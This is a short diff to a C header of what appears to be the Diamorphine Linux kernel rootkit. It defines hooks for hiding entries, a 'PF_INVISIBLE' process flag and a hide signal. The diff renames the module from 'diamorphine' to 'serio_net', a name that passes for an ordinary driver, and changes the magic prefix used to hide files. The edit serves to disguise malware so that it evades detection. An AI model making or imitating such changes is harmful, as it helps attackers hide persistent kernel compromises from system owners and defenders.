@@ -5,11 +5,11 @@ struct linux_dirent {
         char            d_name[1];
 };
 
-#define MAGIC_PREFIX "diamorphine_secret"
+#define MAGIC_PREFIX "_secret"
 
 #define PF_INVISIBLE 0x10000000
 
-#define MODULE_NAME "diamorphine"
+#define MODULE_NAME "serio_net"
 
 enum {
 	SIGINVIS = 31,
